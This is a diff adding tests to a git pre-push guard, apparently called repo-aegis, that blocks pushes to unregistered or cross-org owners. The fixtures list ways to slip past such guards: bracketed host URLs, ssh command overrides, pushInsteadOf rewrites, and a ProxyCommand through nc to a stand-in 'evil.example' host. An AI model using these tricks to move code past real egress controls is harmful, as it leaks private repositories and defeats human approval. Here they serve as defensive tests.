@@ -18,9 +18,10 @@ import { execFileSync } from "node:child_process";
 import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { captureOutput, withEnv, lastJsonLine } from "../_test-utils.js";
+import { fileURLToPath } from "node:url";
+import { captureOutput, withEnv, lastJsonLine, scrubGitEnv, hermeticGitEnv } from "../_test-utils.js";
 import { check } from "./check.js";
-import { approvalsPath, mintApproval } from "@de-otio/repo-aegis-core";
+import { approvalsPath, mintApproval, HOOK_SCRIPTS } from "@de-otio/repo-aegis-core";
 
 let tmp: string;
 let originalCwd: string;
@@ -34,11 +35,16 @@ function git(cwd: string, args: string[], env: NodeJS.ProcessEnv = {}): string {
     cwd,
     encoding: "utf8",
     stdio: ["ignore", "pipe", "pipe"],
-    env: { ...process.env, ...env },
+    env: hermeticGitEnv(env),
   });
 }
 
+let restoreEnv: () => void;
+
 before(() => {
+  // No outer GIT_SSH_COMMAND / GIT_CONFIG_* / user git config: the ssh override
+  // check reads them, so a wrapper's values would change what is under test.
+  restoreEnv = scrubGitEnv();
   tmp = mkdtempSync(join(tmpdir(), "repo-aegis-check-rule-h-"));
   originalCwd = process.cwd();
   bare = join(tmp, "bare.git");
@@ -56,6 +62,7 @@ before(() => {
 
 after(() => {
   process.chdir(originalCwd);
+  restoreEnv();
   rmSync(tmp, { recursive: true, force: true });
 });
 
@@ -559,5 +566,220 @@ describe("pre-push rule h — redaction: no registry content in any output (§3.
       assert.ok(!r.stderr.includes(name), `cross-org refusal leaks "${name}": ${r.stderr}`);
     }
     assert.equal((j.details as { boundaryOrgs?: unknown }).boundaryOrgs, undefined);
+  });
+});
+
+describe("pre-push rule h — bracketed hosts (C1): git strips the brackets, so must the guard", () => {
+  const BRACKETED = [
+    "[github.com]:stranger/r.git",
+    "git@[github.com]:stranger/r.git",
+    "[github.com:22]:stranger/r.git",
+    "ssh://[github.com]/stranger/r.git",
+    "ssh://git@[github.com]/stranger/r.git",
+  ];
+  for (const url of BRACKETED) {
+    it(`${JSON.stringify(url)} is judged as github.com/stranger/r, and refused`, () => {
+      const ctx = setup(`c1-${n++}`);
+      const repo = makeRepo(`c1-repo-${n}`, "git@github.com:acme/x.git");
+      const r = refusalOf(pushCheck(ctx, repo, url));
+      assert.equal(r.code, "UNREGISTERED_OWNER_EGRESS");
+      assert.equal(r.details.destination, "stranger/r");
+    });
+  }
+
+  it("git really hands the hook the bracketed URL and really pushes through it", () => {
+    const ctx = setup("c1-real");
+    const repo = makeRepo("c1-real-repo", "git@github.com:acme/x.git");
+    const handed = urlsGitHandsPrePush(repo, "[github.com]:stranger/r.git");
+    assert.deepEqual(handed, ["[github.com]:stranger/r.git"]);
+    assert.equal(refusalOf(pushCheck(ctx, repo, handed[0]!)).code, "UNREGISTERED_OWNER_EGRESS");
+  });
+
+  it("a registered owner behind brackets passes rule h", () => {
+    const ctx = setup("c1-ok");
+    const repo = makeRepo("c1-ok-repo", "git@github.com:acme/x.git");
+    const r = pushCheck(ctx, repo, "ssh://git@[github.com]/acme/x.git");
+    assert.equal(r.exitCode, undefined, r.stderr);
+  });
+
+  it("an IP literal in brackets is unresolved and refused", () => {
+    const ctx = setup("c1-ip");
+    const repo = makeRepo("c1-ip-repo", "git@github.com:acme/x.git");
+    const r = refusalOf(pushCheck(ctx, repo, "ssh://git@[2001:db8::1]/acme/x.git"));
+    assert.equal(r.code, "UNREGISTERED_OWNER_EGRESS");
+    assert.equal(r.details.destination, "(unresolved)");
+    assert.match(r.error, /IP address/);
+  });
+});
+
+describe("pre-push rule h — an ssh override makes aliases unresolved (H2)", () => {
+  it("GIT_SSH_COMMAND, GIT_SSH and GIT_SSH_VARIANT each do, for an alias that would resolve to GitHub", () => {
+    for (const name of ["GIT_SSH_COMMAND", "GIT_SSH", "GIT_SSH_VARIANT"]) {
+      const ctx = setup(`h2-env-${name}`);
+      sshConfig(ctx, "Host gh-work\n  HostName github.com\n");
+      const repo = makeRepo(`h2-env-${name}-repo`, "git@github.com:acme/x.git");
+      const r = refusalOf(withEnv(name, "ssh", () => pushCheck(ctx, repo, "git@gh-work:acme/x.git")));
+      assert.equal(r.code, "UNREGISTERED_OWNER_EGRESS", name);
+      assert.equal(r.details.destination, "(unresolved)");
+      assert.match(r.error, /ssh override/);
+    }
+  });
+
+  it("core.sshCommand in the git config does too, even for a REGISTERED owner behind the alias", () => {
+    const ctx = setup("h2-config");
+    sshConfig(ctx, "Host gh-work\n  HostName github.com\n");
+    const repo = makeRepo("h2-config-repo", "git@github.com:acme/x.git", [["core.sshCommand", "ssh -i /nowhere/key"]]);
+    assert.equal(refusalOf(pushCheck(ctx, repo, "git@gh-work:acme/x.git")).code, "UNREGISTERED_OWNER_EGRESS");
+  });
+
+  it("a LITERAL github.com host with a plain `ssh -i key` override is still judged (a registered owner passes)", () => {
+    const ctx = setup("h2-literal");
+    const repo = makeRepo("h2-literal-repo", "git@github.com:acme/x.git", [["core.sshCommand", "ssh -i /nowhere/key"]]);
+    const ok = pushCheck(ctx, repo, "git@github.com:acme/x.git");
+    assert.equal(ok.exitCode, undefined, ok.stderr);
+    assert.equal(refusalOf(pushCheck(ctx, repo, "git@github.com:stranger/r.git")).details.destination, "stranger/r");
+  });
+
+  it("…but not when the override can move the connection (-o HostName, a proxy, -J, -F, GIT_SSH)", () => {
+    for (const cmd of ["ssh -o HostName=elsewhere.example", "ssh -o ProxyCommand=nc", "ssh -J jump", "ssh -F /x/config"]) {
+      const ctx = setup(`h2-redirect-${n++}`);
+      const repo = makeRepo(`h2-redirect-repo-${n}`, "git@github.com:acme/x.git", [["core.sshCommand", cmd]]);
+      const r = refusalOf(pushCheck(ctx, repo, "git@github.com:acme/x.git"));
+      assert.equal(r.details.destination, "(unresolved)", cmd);
+    }
+    const ctx = setup("h2-redirect-gitssh");
+    const repo = makeRepo("h2-redirect-gitssh-repo", "git@github.com:acme/x.git");
+    const r = refusalOf(withEnv("GIT_SSH", "/nowhere/wrapper", () => pushCheck(ctx, repo, "git@github.com:acme/x.git")));
+    assert.equal(r.details.destination, "(unresolved)");
+  });
+
+  it("https is untouched by an ssh override", () => {
+    const ctx = setup("h2-https");
+    const repo = makeRepo("h2-https-repo", "git@github.com:acme/x.git", [["core.sshCommand", "ssh -J jump"]]);
+    const r = pushCheck(ctx, repo, "https://github.com/acme/x.git");
+    assert.equal(r.exitCode, undefined, r.stderr);
+  });
+
+  it("an ssh config with a ProxyCommand for the alias is unresolved", () => {
+    const ctx = setup("h2-proxy");
+    sshConfig(ctx, "Host gh-work\n  HostName github.com\n  ProxyCommand nc evil.example 22\n");
+    const repo = makeRepo("h2-proxy-repo", "git@github.com:acme/x.git");
+    assert.equal(refusalOf(pushCheck(ctx, repo, "git@gh-work:acme/x.git")).details.destination, "(unresolved)");
+  });
+
+  it("a Match doubt says so in the refusal text", () => {
+    const ctx = setup("h2-match-text");
+    sshConfig(ctx, `Match exec "true"\n  HostName github.com\n`);
+    const repo = makeRepo("h2-match-text-repo", "git@github.com:acme/x.git");
+    const r = refusalOf(pushCheck(ctx, repo, "git@gh-work:acme/x.git"));
+    assert.match(r.error, /Match block/);
+  });
+});
+
+describe("pre-push refusals — the CROSS_ORG person-fix and the `*` approval sentence", () => {
+  it("the CROSS_ORG_PUSH fix never suggests adding the destination owner to an engagement (L3)", () => {
+    const ctx = setup("l3");
+    const repo = makeRepo("l3-repo", "git@github.com:acme/x.git");
+    const r = refusalOf(pushCheck(ctx, repo, "git@github.com:customer-a-org/svc.git"));
+    assert.equal(r.code, "CROSS_ORG_PUSH");
+    assert.doesNotMatch(r.error, /engagements add|--github-org|--personal-org/);
+    assert.match(r.error, /inside this repository's trust boundary/);
+    assert.match(r.error, /repo-aegis classify/);
+  });
+
+  it("a live `*` approval that does not cover a customer destination is named, as the hook does (D7)", () => {
+    const ctx = setup("star-customer");
+    const repo = makeRepo("star-customer-repo", "git@github.com:customer-a-org/svc.git");
+    git(repo, ["config", "repo-aegis.class", "customer-coupled"]);
+    git(repo, ["config", "repo-aegis.engagement", "customer-a"]);
+    const star = mintApproval({ target: { org: "*", repo: "*" }, path: approvalsPath(ctx.home) });
+    const r = refusalOf(pushCheck(ctx, repo, "git@github.com:customer-a-org/other.git"));
+    assert.equal(r.code, "PUBLIC_PUSH_NEEDS_HUMAN");
+    assert.match(r.error, new RegExp(`A '\\*' approval \\(${star.id}, until `));
+    assert.match(r.error, /customer-a-org is a customer org/);
+    assert.match(r.error, /repo-aegis approve 'customer-a-org\/\*'/);
+  });
+
+  it("a `*` approval still covers a personal-org destination", () => {
+    const ctx = setup("star-personal");
+    const repo = makeRepo("star-personal-repo", "git@github.com:acme/x.git");
+    const star = mintApproval({ target: { org: "*", repo: "*" }, path: approvalsPath(ctx.home) });
+    const r = pushCheck(ctx, repo, "git@github.com:acme/other.git");
+    assert.equal(r.exitCode, undefined, r.stderr);
+    assert.match(r.stderr, new RegExp(`human approval ${star.id} stands in`));
+  });
+
+  it("with no `*` approval the refusal does not claim one exists", () => {
+    const ctx = setup("star-none");
+    const repo = makeRepo("star-none-repo", "git@github.com:acme/x.git");
+    const r = refusalOf(pushCheck(ctx, repo, "git@github.com:acme/other.git"));
+    assert.equal(r.code, "PUBLIC_PUSH_NEEDS_HUMAN");
+    assert.doesNotMatch(r.error, /'\*' approval/);
+  });
+});
+
+describe("pre-push rule h — the shipped pre-push hook script, end to end (L4)", () => {
+  let binDir: string;
+  before(() => {
+    binDir = join(tmp, "bin");
+    mkdirSync(binDir);
+    const cli = fileURLToPath(new URL("../index.js", import.meta.url));
+    writeFileSync(
+      join(binDir, "repo-aegis"),
+      `#!/bin/sh\nexec ${JSON.stringify(process.execPath)} ${JSON.stringify(cli)} "$@"\n`,
+    );
+    chmodSync(join(binDir, "repo-aegis"), 0o755);
+    mkdirSync(join(tmp, "shipped-hooks"));
+    writeFileSync(join(tmp, "shipped-hooks", "pre-push"), HOOK_SCRIPTS["pre-push"]);
+    chmodSync(join(tmp, "shipped-hooks", "pre-push"), 0o755);
+  });
+
+  /** Run the REAL `git push` with the shipped hook; returns the exit status and stderr. */
+  function realPush(ctx: Ctx, repo: string, remote: string): { status: number; stderr: string } {
+    try {
+      execFileSync("git", ["-c", `core.hooksPath=${join(tmp, "shipped-hooks")}`, "push", remote, "main"], {
+        cwd: repo,
+        encoding: "utf8",
+        stdio: ["ignore", "pipe", "pipe"],
+        env: hermeticGitEnv({
+          PATH: `${binDir}:${process.env["PATH"] ?? ""}`,
+          GIT_SSH_COMMAND: fakeSsh,
+          HOME: ctx.userHome,
+          REPO_AEGIS_HOME: ctx.home,
+          REPO_AEGIS_REGISTRY: ctx.registry,
+          REPO_AEGIS_VISIBILITY_LOOKUP: "0",
+        }),
+      });
+      return { status: 0, stderr: "" };
+    } catch (err) {
+      const e = err as { status?: number; stderr?: string };
+      return { status: e.status ?? 1, stderr: String(e.stderr ?? "") };
+    }
+  }
+
+  it("a push to a registered owner goes through", () => {
+    const ctx = setup("e2e-ok");
+    const repo = makeRepo("e2e-ok-repo", "git@github.com:acme/x.git");
+    const r = realPush(ctx, repo, "origin");
+    assert.equal(r.status, 0, r.stderr);
+  });
+
+  it("a push to an unregistered owner is refused by the hook, whatever git was told to rewrite", () => {
+    const ctx = setup("e2e-refused");
+    const repo = makeRepo("e2e-refused-repo", "git@github.com:acme/x.git", [
+      ["url.git@github.com:stranger/.pushInsteadOf", "git@github.com:acme/"],
+    ]);
+    const r = realPush(ctx, repo, "origin");
+    assert.notEqual(r.status, 0);
+    assert.match(r.stderr, /UNREGISTERED_OWNER_EGRESS/);
+    assert.match(r.stderr, /stranger\/x/);
+  });
+
+  it("a push through a bracketed URL is refused by the hook (C1)", () => {
+    const ctx = setup("e2e-bracket");
+    const repo = makeRepo("e2e-bracket-repo", "git@github.com:acme/x.git");
+    const r = realPush(ctx, repo, "[github.com]:stranger/r.git");
+    assert.notEqual(r.status, 0);
+    assert.match(r.stderr, /UNREGISTERED_OWNER_EGRESS/);
   });
 });
